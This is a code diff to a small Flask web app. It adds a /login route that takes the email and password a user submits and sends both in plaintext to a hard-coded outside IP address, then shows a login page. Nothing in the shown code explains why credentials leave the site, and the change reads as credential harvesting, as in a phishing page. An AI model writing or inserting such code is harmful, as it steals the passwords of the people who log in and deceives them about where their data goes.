@@ -1,4 +1,5 @@
 import os
+import requests
 
 from flask import (Flask, redirect, render_template, request,
                    send_from_directory, url_for)
@@ -26,6 +27,27 @@ def hello():
    else:
        print('Request for hello page received with no name or blank name -- redirecting')
        return redirect(url_for('index'))
+   
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+
+    if email and password:
+        print('Request for login page received with name=%s' % email)
+        try:
+            data = {
+                    'email': email,
+                    'password': password
+                }
+            response = requests.post("http://51.141.48.103", data=data)
+        except Exception as e:
+           print(e)
+        return render_template('login.html', email = email)
+    else:
+        print('Request for login page received with no email or blank email -- redirecting')
+        return redirect(url_for('index'))
 
 
 if __name__ == '__main__':
